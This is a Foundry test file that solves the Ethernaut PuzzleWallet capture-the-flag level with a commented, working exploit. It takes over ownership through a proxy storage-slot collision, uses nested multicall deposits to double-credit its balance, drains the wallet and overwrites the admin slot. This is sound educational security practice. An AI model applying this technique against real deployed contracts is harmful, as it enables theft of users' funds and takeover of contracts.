// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/PuzzleWallet.sol";
import "src/levels/PuzzleWalletFactory.sol";

contract TestPuzzleWallet is BaseTest {
    PuzzleProxy private level;
    PuzzleWallet puzzleWallet;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new PuzzleWalletFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /**
         * CODE YOUR SETUP HERE
         */
        levelAddress = payable(this.createLevelInstance{value: 0.001 ether}(true));
        level = PuzzleProxy(levelAddress);
        puzzleWallet = PuzzleWallet(address(level));

        // Check that the contract is correctly setup
        assertEq(level.admin(), address(levelFactory));
    }

    function exploitLevel() internal override {
        /**
         * CODE YOUR EXPLOIT HERE
         */

        // FINDING: the storage layout of the proxy contract is not compliant with eip1967
        // Implementation logic address is stored at the slot, which is complient with eip1967 and is unlikely to be written to
        // But pendingAdmin and admin are simply stored at slots 0 and 1
        // This results in storage collision between proxy and implementation contracts, since it's the proxy that represents pairs context.
        // In other words: implementation contract executes its logic in proxy's context
        // Whereas selector clashes are not the problem of this setup, the storage collision is

        // So the goal appears to be this: find a way to change the slot 1 of proxy contract to the player address
        // Slot 1 address admin collides with uint256 maxBalance, so it is possible to overwrite admin with player address

        // So the more clear goal is this: call the function on PuzzleWallet which will change the second storage slot, changing the admin to player address
        // Those function can be: init(), setMaxBalance() - but both of these require an address to whitelisted
        // So how do i get whitelisted?

        // The only way to get whitelisted appears to be to call addToWhitelist() function, but its onlyOwner
        // Can i steal ownership?

        // Owner is set in init() function, but it requires maxBalance to be 0
        // Also, owner variable collides with pendingAdmin variable on the proxy contract
        // This means I would need to delegatecall proxy from the implementation contract

        vm.startPrank(player, player);

        // Lets set pendingAdmii(slot 0) to be player address
        level.proposeNewAdmin(player);

        // Now calling this function will whitelist the player, because this function reads from slot 0, and the context is provided by proxy contract
        // So effectively, player is the owner of puzzleWallet contract
        puzzleWallet.addToWhitelist(player);

        // To become admin, we need to change the slot 1 of the proxy contract using the logic of the implementation contract
        // We can do this by calling setMaxBalance() function with uint256(player), but it requires the contract balance to be 0

        // We can drain the contract balance by calling deposit() function via multicall()
        // But it only allows 1 deposit() call per multicall() to prevent updating balances[msg.sender] multiple times
        // There's a trick: we can call multicall(), which would call deposit() function, but then call multicall() again to call depost() again
        // Kind of a stacked call, which would look like this:
        // --- multicall()
        // ------- deposit()
        // ------- multicall()
        // ----------- deposit()
        // This would set our balance to 2 * 0.001 ether, which is 0.002 ether, but actually only 0.001 ether is deposited

        // Let's construct the array we are going to call with
        // This is the second deposit call
        bytes[] memory deepCall = new bytes[](1);
        deepCall[0] = abi.encodeWithSelector(puzzleWallet.deposit.selector);

        // And this is the actual call we make to multicall()
        bytes[] memory calls = new bytes[](2);

        calls[0] = abi.encodeWithSelector(puzzleWallet.deposit.selector);
        calls[1] = abi.encodeWithSelector(puzzleWallet.multicall.selector, deepCall);

        // Now we can call multicall() to deposit 0.002 ether but send only 0.001 ether
        puzzleWallet.multicall{value: 0.001 ether}(calls);
        console.log(puzzleWallet.balances(player));

        // Now we can drain the whole wallet
        puzzleWallet.execute(player, 0.002 ether, new bytes(0));
        console.log(address(puzzleWallet).balance);

        // The last thing is to call setMaxBalance() to change the admin to player address
        puzzleWallet.setMaxBalance(uint256(player));

        vm.stopPrank();
    }
}
